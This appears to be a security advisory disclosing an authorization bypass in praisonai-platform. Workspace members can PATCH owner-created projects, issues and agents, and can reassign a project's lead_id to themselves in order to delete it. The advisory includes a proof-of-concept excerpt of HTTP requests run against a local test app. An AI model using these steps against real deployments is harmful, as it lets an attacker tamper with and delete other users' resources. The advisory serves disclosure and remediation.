id: PYSEC-0000-praisonai-platform-GHSA-c78w-2q4r-68r7
summary: 'PraisonAI: Platform member PATCH routes allow owner resource rewrites and
  project lead reassignment delete bypass'
details: |-
  # Platform member PATCH routes allow owner resource rewrites and project lead reassignment delete bypass

  ## Summary

  `praisonai-platform` lets an ordinary workspace member patch owner-created project, issue, and agent records even though the paired delete routes enforce owner/admin authorization. For projects, the member can first patch `lead_id` to their own user id and then delete the owner-created project, bypassing a delete guard that correctly returned `403` before the reassignment.

  ## Technical Details

  The affected boundary is the difference between "is a workspace member" and "owns or administers this resource". `src/praisonai-platform/praisonai_platform/api/deps.py` defines `require_workspace_member`, `require_workspace_admin`, `require_workspace_owner`, and `require_delete_permission`. `require_workspace_member` only checks that the caller has at least the `member` role in the workspace, while `require_delete_permission` allows delete only for workspace admins/owners or the resource owner.

  The project update route in `src/praisonai-platform/praisonai_platform/api/routes/projects.py` defines `PATCH /workspaces/{workspace_id}/projects/{project_id}` with `user: AuthIdentity = Depends(require_workspace_member)`. It passes `title`, `description`, `status`, `lead_type`, and `lead_id` into `ProjectService.update`. `src/praisonai-platform/praisonai_platform/services/project_service.py` then writes `project.lead_id = lead_id` when supplied. The paired project delete route first loads the project and calls `require_delete_permission(workspace_id, user, session, resource_owner_id=project.lead_id)`. This means an ordinary member can mutate the ownership field that the delete route later trusts.

  The same update/delete asymmetry exists for issues and agents. `src/praisonai-platform/praisonai_platform/api/routes/issues.py` defines `PATCH /workspaces/{workspace_id}/issues/{issue_id}` with only `require_workspace_member`, validates referenced ids are in the workspace, then calls `IssueService.update` to write fields including `title`, `description`, `status`, `priority`, `assignee_id`, and `project_id`. The paired delete route checks `resource_owner_id=issue.creator_id`. `src/praisonai-platform/praisonai_platform/api/routes/agents.py` defines `PATCH /workspaces/{workspace_id}/agents/{agent_id}` with only `require_workspace_member` and calls `AgentService.update` to write fields including `instructions`, `runtime_mode`, and `runtime_config`; the paired delete route checks `resource_owner_id=agent.owner_id`.

  The intended owner/admin boundary is visible from the delete routes and from the local negative controls: a workspace member cannot directly delete an owner-created project, issue, or agent, and a non-member cannot patch an issue. The vulnerability is that the PATCH routes do not apply an equivalent owner/admin or resource-specific update guard.

  ## PoV

  the PoV starts an in-memory FastAPI app backed by SQLite, creates an owner, a member, and an outsider, adds the member to the owner's workspace, then exercises the project, issue, and agent routes without touching any live service.

  Essential excerpt:

  ```python
  direct_delete_project = await client.delete(
      f"/api/v1/workspaces/{workspace_id}/projects/{project_id}",
      headers=member_headers,
  )

  patch_project = await client.patch(
      f"/api/v1/workspaces/{workspace_id}/projects/{project_id}",
      json={
          "title": "Member-controlled project",
          "status": "active",
          "lead_type": "member",
          "lead_id": member_id,
      },
      headers=member_headers,
  )

  delete_project_after_takeover = await client.delete(
      f"/api/v1/workspaces/{workspace_id}/projects/{project_id}",
      headers=member_headers,
  )

  patch_issue = await client.patch(
      f"/api/v1/workspaces/{workspace_id}/issues/{issue_id}",
      json={"title": "Member rewrote owner issue", "status": "done"},
      headers=member_headers,
  )

  patch_agent = await client.patch(
      f"/api/v1/workspaces/{workspace_id}/agents/{agent_id}",
      json={"instructions": "member-controlled instructions", "status": "idle"},
      headers=member_headers,
  )

  outsider_patch_issue = await client.patch(
      f"/api/v1/workspaces/{workspace_id}/issues/{issue_id}",
      json={"title": "outsider attempt"},
      headers=outsider_headers,
  )
  ```

  The full PoV script is included in the appendix below as `pov_platform_member_update_bypass.py`.

